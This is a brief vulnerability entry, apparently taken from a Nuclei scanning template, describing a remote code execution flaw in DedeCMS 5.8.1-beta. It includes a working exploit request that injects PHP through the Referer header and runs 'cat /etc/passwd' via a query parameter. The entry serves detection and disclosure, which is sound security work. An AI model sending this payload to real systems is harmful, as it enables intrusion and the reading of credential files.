# Vulnerability: DedeCMS 5.8.1-beta - Remote Code Execution
**Classification:** CWE-78,CWE-94
**Source:** Nuclei Template (`dedecms-rce.yaml`)

## Description
DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
Host: {{Hostname}}
Referer: <?php "system"($c);die;/*ref
```

